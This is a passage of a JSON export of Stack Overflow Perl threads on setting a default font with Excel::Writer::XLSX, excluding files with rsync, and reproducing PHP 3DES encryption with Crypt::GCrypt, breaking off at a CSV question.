is not guaranteed to work now or at anytime in the future. The only valid way to set the default format in Excel 2007+ is to update the theme.xml file and that isn&#39;t currently supported in Excel::Writer::XLSX."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 28655, "user_id": 10238, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b8c3b1025babebf20168dd90ea8f268c?s=128&d=identicon&r=PG", "display_name": "jmcnamara", "link": "https://stackoverflow.com/users/10238/jmcnamara"}, "edited": false, "score": 0, "creation_date": 1466423895, "post_id": 37918617, "comment_id": 63294072, "body": "@jmcnamara thank you for clarifying. But wouldn&#39;t that also apply to your code in the constructor where I found it?"}, {"owner": {"reputation": 28655, "user_id": 10238, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b8c3b1025babebf20168dd90ea8f268c?s=128&d=identicon&r=PG", "display_name": "jmcnamara", "link": "https://stackoverflow.com/users/10238/jmcnamara"}, "edited": false, "score": 0, "creation_date": 1466426103, "post_id": 37918617, "comment_id": 63295522, "body": "The constructor sets the default format to match the default format in the default theme file. Your workaround may work in some cases but not all."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 28655, "user_id": 10238, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b8c3b1025babebf20168dd90ea8f268c?s=128&d=identicon&r=PG", "display_name": "jmcnamara", "link": "https://stackoverflow.com/users/10238/jmcnamara"}, "edited": false, "score": 0, "creation_date": 1466426208, "post_id": 37918617, "comment_id": 63295590, "body": "@jmcnamara I see. I don&#39;t even have an Excel to test with. I tried with Libre Office 5 and only with one case. But it looked like it worked. Is the old part of my answer valid in your opinion?"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 28655, "user_id": 10238, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b8c3b1025babebf20168dd90ea8f268c?s=128&d=identicon&r=PG", "display_name": "jmcnamara", "link": "https://stackoverflow.com/users/10238/jmcnamara"}, "edited": false, "score": 0, "creation_date": 1466426338, "post_id": 37918617, "comment_id": 63295687, "body": "See my edit. I think it&#39;s clear now that it&#39;s maybe not a good idea to do this."}, {"owner": {"reputation": 28655, "user_id": 10238, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b8c3b1025babebf20168dd90ea8f268c?s=128&d=identicon&r=PG", "display_name": "jmcnamara", "link": "https://stackoverflow.com/users/10238/jmcnamara"}, "edited": false, "score": 0, "creation_date": 1466427182, "post_id": 37918617, "comment_id": 63296266, "body": "The old part of the answer still looks valid."}, {"owner": {"reputation": 95, "user_id": 242617, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/2939473167144b7a0a59cdf330105134?s=128&d=identicon&r=PG", "display_name": "tsoomo", "link": "https://stackoverflow.com/users/242617/tsoomo"}, "edited": false, "score": 0, "creation_date": 1466436108, "post_id": 37918617, "comment_id": 63302876, "body": "Thanks for answers. So I can set x, y axis fonts and title&#39;s font for Charts. But I can&#39;t set it for series names. I&#39;m testing it on MS EXCEL 2010/2016."}], "tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": true, "score": 3, "last_activity_date": 1466426313, "last_edit_date": 1495535640, "creation_date": 1466413918, "answer_id": 37918617, "question_id": 37917767, "link": "https://stackoverflow.com/questions/37917767/how-do-i-set-a-workbook-wide-default-format-with-excelwriterxlsx/37918617#37918617", "title": "How do I set a workbook-wide default format with Excel::Writer::XLSX?", "body": "<p><strong>Maybe.</strong></p>\n\n<p><strong>Disclaimer:</strong> the author of Excel::Writer::XLSX explains this is not a good idea and is not guaranteed to work <a href=\"https://stackoverflow.com/questions/37917767/how-do-i-set-a-workbook-wide-default-format-with-excelwriterxlsx/37918617?noredirect=1#comment63293812_37918617\">here</a> and <a href=\"https://stackoverflow.com/questions/37917767/how-do-i-set-a-workbook-wide-default-format-with-excelwriterxlsx/37918617?noredirect=1#comment63295522_37918617\">here</a>.</p>\n\n<p>You can set the property <code>xf_index</code> to <code>0</code> when creating a Format object. That will set that Format as the default one.</p>\n\n<pre><code>use Excel::Writer::XLSX;\n\nmy $workbook  = Excel::Writer::XLSX-&gt;new( 'filename.xlsx' );\n\n# set the default format\n$workbook-&gt;add_format(xf_index =&gt; 0, font =&gt; 'Comic Sans MS' ); # I'm on Linux\n\nmy $worksheet = $workbook-&gt;add_worksheet();\n$worksheet-&gt;write( 0, 0, 'Hi Excel!' );      # will be in Comic Sans\n\nmy $format = $workbook-&gt;add_format(font =&gt; 'Arial' );\n$worksheet-&gt;write( 1, 1, 'In Arial!', $format );\n</code></pre>\n\n<p>This is not described in the docs, but <a href=\"https://metacpan.org/source/JMCNAMARA/Excel-Writer-XLSX-0.95/lib/Excel/Writer/XLSX/Workbook.pm#L139\" rel=\"nofollow noreferrer\">reading the code</a> explains it.</p>\n\n<p>It works even if you add more formats later. You do not need to keep the Format object of that initial call. It will be used throughout the workbook (probably also on different sheets, but I didn't test that).</p>\n\n<p>I suggest explaining what you're doing in a code comment because it's really not very obvious.</p>\n\n<p>After a bit of additional research I found it explained in <a href=\"http://www.openoffice.org/sc/excelfileformat.pdf\" rel=\"nofollow noreferrer\">the PDF document <em>OpenOffice.org's Documentation of the Microsoft Excel File Format</em></a>,  in chapter 4.6.2 at the bottom of page 89 (emphasis mine).</p>\n\n<blockquote>\n  <p>The default cell format\n  is always present in an Excel file, described by the XF record with the fixed index 15 (0-based). <strong>By default, it uses the\n  worksheet/workbook default cell style, described by the very first XF record (index 0).</strong></p>\n</blockquote>\n\n<p>So now we also know why it's <code>xf_index =&gt; 0</code>.</p>\n\n<hr>\n\n<p><strong>Old answer with general advice:</strong></p>\n\n<p>In general that's not supported. You need to work with formats. <a href=\"https://metacpan.org/pod/Excel::Writer::XLSX#Working-with-formats\" rel=\"nofollow noreferrer\">The docs say</a> that there is a default format with Calibri in size 11.</p>\n\n<blockquote>\n  <p>The default format is Calibri 11 with all other properties off.</p>\n</blockquote>\n\n<p>You need to create a format object for a specific combination of formatting, font family, font size and so on and then you can reuse that throughout the document in each cell or chart. If one of the options differs in a specific cell, you need to make an additional Format object for that.</p>\n\n<pre><code>my $default_format = $workbook-&gt;add_format( font =&gt; 'Comic Sans' );\n\n# ...\n\n$worksheet-&gt;write( 'A1', 'Cell A1', $default_format );\n\n# later ...\n\n$worksheet-&gt;write( 'Z3', 'Cell Z3', $default_format );\n</code></pre>\n\n<p>If you need a lot of different formatting, but always want to use the same font, it might be useful to set the font string as a format hash and use that. </p>\n\n<pre><code>my %default_formatting = ( font =&gt; 'Comic Sans' );\nmy $bold_format = $workbook-&gt;add_format( %default_formatting, bold =&gt; 1 );\n</code></pre>\n\n<p>Maybe even make a sub that helps to create the Format objects and already knows about the default font.</p>\n\n<pre><code>sub create_format {\n    my ($workbook, %formats) = @_;\n    return $workbook-&gt;add_format( font =&gt; 'Comic Sans', %formats );\n}\n\n# somewhere\nmy $bold_format = create_format( $workbook, bold =&gt; 1 );\n$worksheet-&gt;write( 'A1', 'Cell A1', $bold_format );\n</code></pre>\n\n<p>That would also allow <em>throw-away</em> formats like this:</p>\n\n<pre><code>$worksheet-&gt;write( 'D1', 'Weird stuff', create_format( \n    $workbook, \n    bold      =&gt; 1,\n    strikeout =&gt; 1, \n    shadow    =&gt; 1,\n    bg_color  =&gt; 'pink',\n));\n</code></pre>\n"}], "owner": {"reputation": 95, "user_id": 242617, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/2939473167144b7a0a59cdf330105134?s=128&d=identicon&r=PG", "display_name": "tsoomo", "link": "https://stackoverflow.com/users/242617/tsoomo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1190, "favorite_count": 1, "accepted_answer_id": 37918617, "answer_count": 1, "score": 5, "last_activity_date": 1466426313, "creation_date": 1466411366, "last_edit_date": 1466415506, "question_id": 37917767, "link": "https://stackoverflow.com/questions/37917767/how-do-i-set-a-workbook-wide-default-format-with-excelwriterxlsx", "title": "How do I set a workbook-wide default format with Excel::Writer::XLSX?", "body": "<p>Is it possible to change or declare a default font with <a href=\"https://metacpan.org/pod/Excel::Writer::XLSX\" rel=\"nofollow\">Excel::Writer::XLSX</a>?\nI can set it for charts and cells every time I create or add them. But I think there should be a more simple way.</p>\n"}, {"tags": ["perl", "rsync"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1466398066, "post_id": 37914660, "comment_id": 63280937, "body": "Why is this question tagged with the Perl language?"}, {"owner": {"reputation": 6068, "user_id": 1799189, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/s4Pcu.jpg?s=128&g=1", "display_name": "xxfelixxx", "link": "https://stackoverflow.com/users/1799189/xxfelixxx"}, "edited": false, "score": 0, "creation_date": 1466398917, "post_id": 37914660, "comment_id": 63281146, "body": "<code>man rsync</code> search for <code>INCLUDE&#47;EXCLUDE PATTERN RULES</code>.  It covers wild-card exclusion."}, {"owner": {"reputation": 6068, "user_id": 1799189, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/s4Pcu.jpg?s=128&g=1", "display_name": "xxfelixxx", "link": "https://stackoverflow.com/users/1799189/xxfelixxx"}, "edited": false, "score": 0, "creation_date": 1466399079, "post_id": 37914660, "comment_id": 63281179, "body": "If you are trying to run rsync with backticks from perl, you might be getting bitten by shell-escaping, so you may need to try escaping the <code>*</code> character."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 6068, "user_id": 1799189, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/s4Pcu.jpg?s=128&g=1", "display_name": "xxfelixxx", "link": "https://stackoverflow.com/users/1799189/xxfelixxx"}, "edited": false, "score": 0, "creation_date": 1466399437, "post_id": 37914660, "comment_id": 63281270, "body": "@xxfelixxx: The issue is that something like <code>--exclude=&#39;$DEST_DIR&#47;*.*&#39;</code> will also exclude all subdirectories of <code>$DEST_DIR</code>, whereas the OP wants to exclude the files but include the subdirectories. I don&#39;t have a system to hand wherer I can install rsync, so I&#39;m guessing wildly."}, {"owner": {"reputation": 6068, "user_id": 1799189, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/s4Pcu.jpg?s=128&g=1", "display_name": "xxfelixxx", "link": "https://stackoverflow.com/users/1799189/xxfelixxx"}, "edited": false, "score": 0, "creation_date": 1466401133, "post_id": 37914660, "comment_id": 63281748, "body": "I think the issue might be that the OP should not use $SOURCE_DIR in the exclude pattern itself.  If that is needed, maybe try syncing from one level up."}], "answers": [{"comments": [{"owner": {"reputation": 3167, "user_id": 1751825, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/c157caf2d0f9ff38e5a9820315c0a15f?s=128&d=identicon&r=PG&f=1", "display_name": "user1751825", "link": "https://stackoverflow.com/users/1751825/user1751825"}, "edited": false, "score": 0, "creation_date": 1466404380, "post_id": 37915402, "comment_id": 63282896, "body": "Thanks, this will work. One limitation though. I&#39;ll need to make sure that there won&#39;t ever be another &#39;src&#39; (or whatever I call it) folder anywhere else in the directory tree, otherwise it may also match the exclusion rules."}, {"owner": {"reputation": 3167, "user_id": 1751825, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/c157caf2d0f9ff38e5a9820315c0a15f?s=128&d=identicon&r=PG&f=1", "display_name": "user1751825", "link": "https://stackoverflow.com/users/1751825/user1751825"}, "edited": false, "score": 0, "creation_date": 1466407344, "post_id": 37915402, "comment_id": 63284386, "body": "Actually just figure out how to do it properly, I can do --exclude=/$SRC/*.pm This ensures that it will only ever apply at the root folder level."}], "tags": [], "owner": {"reputation": 6068, "user_id": 1799189, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/s4Pcu.jpg?s=128&g=1", "display_name": "xxfelixxx", "link": "https://stackoverflow.com/users/1799189/xxfelixxx"}, "is_accepted": true, "score": 1, "last_activity_date": 1466402040, "creation_date": 1466402040, "answer_id": 37915402, "question_id": 37914660, "link": "https://stackoverflow.com/questions/37914660/rsync-exclude-files-in-folders-but-include-subfolders/37915402#37915402", "title": "rsync - exclude files in folders but include subfolders", "body": "<p>The problem is that <code>$SOURCE_DIR</code> is used in the exclusion pattern itself.  I think rsync is only seeing the relative paths deeper than <code>$SOURCE_DIR</code>, so the exclusion is not working.</p>\n\n<p>Solution is to sync from one level up.</p>\n\n<p><strong>test_rsync.sh</strong></p>\n\n<pre><code>#!/bin/bash\n\nBASE=testing\nSRC=src\nDEST=dest\n\nrm -rf $BASE\n\nmkdir -p $BASE/$SRC/foo/bar/baz/qux\nmkdir -p $BASE/$SRC/abc/def/ghi\nmkdir -p $BASE/$SRC/qwe/rty\n\nfor dir in $( find $BASE/$SRC -type d | grep \"[a-z]\" ); do\n    touch $dir/index.cgi\n    touch $dir/Foo.pm\n    touch $dir/Bar.pm\ndone\n\nrsync --recursive --force --delete --exclude=index.cgi --exclude=$SRC/*.pm $BASE/$SRC $BASE/$DEST\n\ndiff -r $BASE/$SRC $BASE/$DEST/$SRC | sort -r\n</code></pre>\n\n<p><strong>Output</strong></p>\n\n<pre><code>Only in testing/src/qwe/rty: index.cgi\nOnly in testing/src/qwe: index.cgi\nOnly in testing/src: index.cgi\nOnly in testing/src: Foo.pm\nOnly in testing/src/foo: index.cgi\nOnly in testing/src/foo/bar: index.cgi\nOnly in testing/src/foo/bar/baz/qux: index.cgi\nOnly in testing/src/foo/bar/baz: index.cgi\nOnly in testing/src: Bar.pm\nOnly in testing/src/abc: index.cgi\nOnly in testing/src/abc/def: index.cgi\nOnly in testing/src/abc/def/ghi: index.cgi\n</code></pre>\n"}], "owner": {"reputation": 3167, "user_id": 1751825, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/c157caf2d0f9ff38e5a9820315c0a15f?s=128&d=identicon&r=PG&f=1", "display_name": "user1751825", "link": "https://stackoverflow.com/users/1751825/user1751825"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 757, "favorite_count": 0, "accepted_answer_id": 37915402, "answer_count": 1, "score": 1, "last_activity_date": 1466402040, "creation_date": 1466397121, "last_edit_date": 1466399086, "question_id": 37914660, "link": "https://stackoverflow.com/questions/37914660/rsync-exclude-files-in-folders-but-include-subfolders", "title": "rsync - exclude files in folders but include subfolders", "body": "<p></p>\n\n<p>I'm trying to setup a Perl web deployment script using rsync.</p>\n\n<p>I need to exclude some files based on wildcards, but only from specific folders and not their subfolders.</p>\n\n<p>If I list just the filenames to exclude then they'll be excluded from any directory, but if I include the full path (source, or destination) I can't get them to match, so they're not excluded.</p>\n\n<p>The rsync commands I've tried look like this</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>rsync --recursive --force --delete --progress --exclude='$SOURCE_DIR/index.cgi' --exclude='$SOURCE_DIR/*.pm' \"$SOURCE_DIR\" \"$DEST_DIR\"\n</code></pre>\n\n<p>and </p>\n\n<pre class=\"lang-none prettyprint-override\"><code>rsync --recursive --force --delete --progress --exclude='$DEST_DIR/index.cgi' --exclude='$DEST_DIR/*.pm' \"$SOURCE_DIR\" \"$DEST_DIR\"\n</code></pre>\n\n<p>Neither of these seems to work, and if I try this</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>rsync --recursive --force --delete --progress --exclude='index.cgi' --exclude='*.pm' \"$SOURCE_DIR\" \"$DEST_DIR\"\n</code></pre>\n\n<p>then it will exclude the files in all folders.</p>\n\n<p>What do I need to do to exclude these files just from the <code>$DEST_DIR folder</code>, but not its subfolders?</p>\n"}, {"tags": ["php", "perl", "libgcrypt"], "comments": [{"owner": {"reputation": 3364, "user_id": 693294, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8d5935d56f077497b60c12cf86b9d2e1?s=128&d=identicon&r=PG", "display_name": "Gilbert", "link": "https://stackoverflow.com/users/693294/gilbert"}, "edited": false, "score": 0, "creation_date": 1466382758, "post_id": 37912868, "comment_id": 63278221, "body": "The final test value is Y2IA5Q74o2Y/7QjVY9Qk7T5P/pK4SZy/eR2kufFYY5iYET3RbH4zx7UziSzR&zwnj;&#8203;/yDqYw2jE2pZogVXpdta&zwnj;&#8203;WL85nbM1pFMyf+RtFCWJ&zwnj;&#8203;lYWMuhQ="}, {"owner": {"reputation": 107760, "user_id": 451475, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a632afa4c11779c0cabd7df04eb26ba6?s=128&d=identicon&r=PG", "display_name": "zaph", "link": "https://stackoverflow.com/users/451475/zaph"}, "edited": false, "score": 0, "creation_date": 1466385404, "post_id": 37912868, "comment_id": 63278657, "body": "If you have any choice do not use 3DES, use AES (Advanced Encryption Standard). Of course you have no need for security 3DES is fine."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1466386395, "post_id": 37912868, "comment_id": 63278825, "body": "@Gilbert: Wow. I&#39;ve never had to work so hard to make someone&#39;s Perl code legible. <b><i>Please</i></b> read the help on using markdown (there&#39;s a link, a question mark in an orange circle, at the top-right of every post open for edit) and <b><i>never</i></b> use HTML markup if you can help it"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1466387567, "post_id": 37912868, "comment_id": 63278995, "body": "I&#39;ve tried to work through your code, but I&#39;m struggling to help. I can&#39;t understand how you&#39;ve learned to write Perl like that as, although using <code>package</code> within a block and basing an object on an array reference are perfectly valid, they are unfamiliar to most experienced Perl programmers. I suggest that you write your package <code>Exxx</code> in a separate file called <code>Exxx.pm</code>, and then <code>use Exxx</code> from your main code. That will help to isolate any errors, and is one of the major advantages of object-oriented programming"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1466391406, "post_id": 37912868, "comment_id": 63279563, "body": "This <code>my $type = ref($class) ? ref($class) : __PACKAGE__</code> is horrible. It tries to support the misconception that you should be able to call the constructor on any instance of a class, and also ignores anything else that is passed as the first parameter unless it is a reference. That will break inheritance, and an illegal call like <code>Exxx::new({})</code> will result in a <code>HASH</code> object, which will break because there is no such package. This should be just <code>$type = $class</code> and perhaps <code>ref $type and die</code>"}, {"owner": {"reputation": 3364, "user_id": 693294, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8d5935d56f077497b60c12cf86b9d2e1?s=128&d=identicon&r=PG", "display_name": "Gilbert", "link": "https://stackoverflow.com/users/693294/gilbert"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1466508465, "post_id": 37912868, "comment_id": 63334832, "body": "@Borodin FYI: this is throw-away test code in a single file and is to be replaced by better."}], "answers": [{"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 0, "last_activity_date": 1466389616, "creation_date": 1466389616, "answer_id": 37913861, "question_id": 37912868, "link": "https://stackoverflow.com/questions/37912868/mimicking-php-openssl-encrypt-and-openssl-decrypt-call-in-perl/37913861#37913861", "title": "Mimicking PHP openssl_encrypt() and openssl_decrypt() call in Perl", "body": "<p>I recommend that you use the excellent <a href=\"https://metacpan.org/pod/Crypt::Cipher\" rel=\"nofollow\"><code>Crypt::Cipher</code></a> library suite. It covers a huge number of ciphers, it is independent of any other module, and I have compiled it successfully using Visual C as well as gcc and g++ without any issues</p>\n\n<p>You will need to specify <code>DES_EDE</code> (same as <em>Triple DES</em> and <em>3DES</em>) when you create a new <code>Crypt::Cipher</code> object, and the rest should be obvious</p>\n\n<pre><code>Crypt::Cipher-&gt;new('DES_EDE', $key);\n</code></pre>\n"}], "owner": {"reputation": 3364, "user_id": 693294, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8d5935d56f077497b60c12cf86b9d2e1?s=128&d=identicon&r=PG", "display_name": "Gilbert", "link": "https://stackoverflow.com/users/693294/gilbert"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 488, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1466389616, "creation_date": 1466378835, "last_edit_date": 1466387954, "question_id": 37912868, "link": "https://stackoverflow.com/questions/37912868/mimicking-php-openssl-encrypt-and-openssl-decrypt-call-in-perl", "title": "Mimicking PHP openssl_encrypt() and openssl_decrypt() call in Perl", "body": "<p>I am trying to write some Perl code to decode <em>Triple DES</em> (3DES) keys generated by a PHP program. I've looked for an example of using <a href=\"https://metacpan.org/pod/Crypt::GCrypt\" rel=\"nofollow\"><code>Crypt::GCrypt</code></a> decoding in Perl but can't find one.</p>\n\n<p>I need a Perl equivalent to PHP's <code>openssl_decode()</code>, but even an encrypt/decrypt of a string does not match.</p>\n\n<p>This is my test code. All values are samples for testing.</p>\n\n<pre><code>use strict;\n\n{\n    # match PHP's openssl_encrypt($plain_text, 'des3', $pw, 0, $iv );\n    #             openssl_decrypt($cipher_text,'des3', $pw, 0, $iv );\n    #   $ee = Exxx-&gt;new( %args );\n    #   $cipher_text = $ee-&gt;encode( $plain_text );\n    #   $plain_text  = $ee-&gt;decode( $cipher_text );\n\n    package Exxx;\n\n    use Crypt::GCrypt;\n    use HTML::Entities;\n    use MIME::Base64;\n\n    my $ex_           = 0;\n    my $exxx_method   = $ex_ ++;\n    my $exxx_password = $ex_ ++;\n    my $exxx_iv       = $ex_ ++;\n    my $exxx_cipher   = $ex_ ++;\n\n    sub new {\n        my ( $class, $method, $passwd, $iv ) = @_;\n\n        my $type = ref($class) ? ref($class) : __PACKAGE__;\n\n        my $this = [];\n\n        $this-&gt;[$exxx_method] = $method ? $method : '3des';\n        $this-&gt;[$exxx_method] = '3des'    # map any PHP name to a Perl name\n                if $this-&gt;[$exxx_method] eq 'des3';\n\n        $this-&gt;[$exxx_password] = pack(\n            'H*',\n            $passwd ? $passwd\n            : '0123456789ABCDEF' .      # key 1\n              'FEDCBA9876543210' .      # key 2\n              '3243F6A8885A308D' );     # key 3\n\n        $this-&gt;[$exxx_iv] = pack(\n            'H*',\n            $iv ? $iv\n            : '2b7e151628aed2a6' );\n\n        bless $this, $type;\n\n        return $this;\n    }\n\n\n    sub _cipher {\n        my ( $this, $encrypting_decrypting ) = @_;\n\n        my $cipher = Crypt::GCrypt-&gt;new(\n            type      =&gt; 'cipher',\n            algorithm =&gt; $this-&gt;[$exxx_method],\n            mode      =&gt; 'cbc',\n            padding   =&gt; 'standard',\n        );\n\n        $cipher-&gt;start($encrypting_decrypting);\n\n        $cipher-&gt;setiv( $this-&gt;[$exxx_iv] );\n\n        return $cipher;\n    }\n\n\n    sub encrypt {\n        my ( $this, $plain_text ) = @_;\n\n        my $cipher = $this-&gt;_cipher(\"encrypting\");\n        $cipher-&gt;encrypt($plain_text);\n\n        my $encrypted = $cipher-&gt;finish();\n\n        return encode_base64( $encrypted, \"\" );\n    }\n\n\n    sub encrypt_html {\n        my ( $this, $plain_html ) = @_;\n        return $this-&gt;encrypt( decode_entities($plain_html) );\n    }\n\n\n    sub decrypt {\n        my ( $this, $crypt_text ) = @_;\n\n        my $cipher     = $this-&gt;_cipher(\"decrypting\");\n        my $plain_text = $cipher-&gt;decrypt( decode_base64($crypt_text) );\n        my $f          = $cipher-&gt;finish();\n\n        return $plain_text;\n    }\n}\n\n############################\n\nmy $exit          = 0;\nmy $plain         = 'Hello, world';                #clear text for both PHP and PERL\nmy $encrypted_php = 'c0WJDTwtcBsj1vTfTi7jwA==';    #crypted from PHP program\n\nmy $exxx = Exxx-&gt;new('des3');\n\nmy $encrypted = $exxx-&gt;encrypt($plain);\n\nif ( $encrypted eq $encrypted_php ) {\n    print \"PASS encrypt:  (perl)$encrypted eq (php)$encrypted_php\\n\";\n}\nelse {                                             #trouble.... does not match PHP\n    print STDERR \"ERROR encrypt: (perl)$encrypted ne (php)$encrypted_php\\n\";\n    $exit = 1;\n}\n\nmy $decrypted = $exxx-&gt;decrypt($encrypted);\n\nif ( $plain eq $decrypted ) {                      #trouble.... does not match PHP\n    print \"PASS decrypt:  (perl)$plain == (perl)$decrypted\\n\";\n    $exit = 1;\n}\n\n{                                                  #trouble.... does not match PHP\n    print STDERR \"ERROR decrypt: (perl)$plain ne (perl)$decrypted\\n\";\n    $exit = 1;\n}\n\nexit $exit;\n</code></pre>\n"}, {"tags": ["regex", "perl", "csv"], "comments": [{"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 1, "creation_date": 1466366198, "post_id": 37911161, "comment_id": 63274366, "body": "What do you mean, &quot;other&quot;? What have you tried?"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 2, "creation_date": 1466389965, "post_id": 37911161, "comment_id": 63279356, "body": "With your experience I am sure you know that Stack Overflow is about helping with <i>specific</i> programming problems. Unless you show us a program and explain your problem we can&#39;t be expected to help you. Please show show your code, and describe the problem with it that you cannot solve"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 2, "creation_date": 1466390145, "post_id": 37911161, "comment_id": 63279381, "body": "Please also note that it is non-standard to use single-quotes to enclose a CSV field, and you need to know with <i>absolute assurance</i> how the data source uses commas, double-quotes, and single-quotes before you can solve this question yourself or ask for help with it. None of this information is in the question."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1466390377, "post_id": 37911161, "comment_id": 63279409, "body": "Is this homework? The data seem to indicate that it probably is."}, {"owner": {"reputation": 7570, "user_id": 17945, "user_type": "registered", "accept_rate": 36, "profile_image": "https://www.gravatar.com/avatar/e8cbc0b9ed29b027a127d8df309af5a6?s=128&d=identicon&r=PG", "display_name": "reinierpost", "link": "https://stackoverflow.com/users/17945/reinierpost"}, "edited": false, "score": 0, "creation_date": 1466426791, "post_id": 37911161, "comment_id": 63295986, "body": "Please define <i>CSV format</i>! Is your file format yours to design, or does it need to be compatible with some CSV-generating or -consuming tool you don&#39;t control?  How do you represent values in fields that contain single quotes, or commas, or doesn&#39;t that ever happen?"}, {"owner": {"reputation": 4937, "user_id": 2445025, "user_type": "registered", "accept_rate": 59, "profile_image": "https://i.stack.imgur.com/HTAcm.jpg?s=128&g=1", "display_name": "Prabhu", "link": "https://stackoverflow.com/users/2445025/prabhu"}, "edited": false, "score": 0, "creation_date": 1466524777, "post_id": 37911161, "comment_id": 63347338, "body": "I had tried this solution and the code is added to the question. Please have a look."}], "answers": [{"tags": [], "owner": {"reputation": 32690, "user_id": 3266847, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/U0oyt.png?s=128&g=1", "display_name": "Benjamin W.", "link": 